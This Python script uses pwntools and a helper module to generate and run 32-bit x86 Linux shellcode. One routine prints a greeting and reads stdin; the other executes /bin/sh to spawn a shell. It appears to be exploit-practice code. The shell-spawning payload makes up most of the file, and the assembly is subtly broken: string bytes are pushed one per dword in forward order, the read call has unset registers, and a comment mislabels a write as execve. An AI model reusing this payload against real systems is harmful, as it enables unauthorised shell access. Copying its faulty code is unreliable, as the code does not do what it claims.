#!/usr/bin/env python
import pwn
import util
import sys


def hello():
    code = ''
    msg = 'Hi!\n'
    for v in util.as_bytes(msg):
        # push
        code += 'push 0x%x\n' % v

    # write: 4, fd, *buf, count
    # execve /bin/sh
    code += 'mov eax, 4\n'
    code += 'mov ebx, 1\n'
    code += 'mov ecx, esp\n'
    code += 'mov edx, %d\n' % (len(msg) + 1)
    code += 'int 0x80\n'

    # read from stdin
    code += 'mov eax, 3\n'
    code += 'xor ebx, ebx\n'
    code += 'int 0x80\n'

    return code


def shellcode():
    code = ''
    for v in util.as_bytes('/bin/sh'):
        # push
        code += 'push 0x%x\n' % v

    # execve /bin/sh
    code += 'mov eax, 11\n'
    code += 'mov ebx, esp\n'
    code += 'xor ecx, ecx\n'
    code += 'xor edx, edx\n'
    code += 'int 0x80\n'

    return code


def main():
    if sys.argv[1] == '--hello':
        util.execute(hello())
    else:
        util.execute(shellcode())


if __name__ == "__main__":
    main()
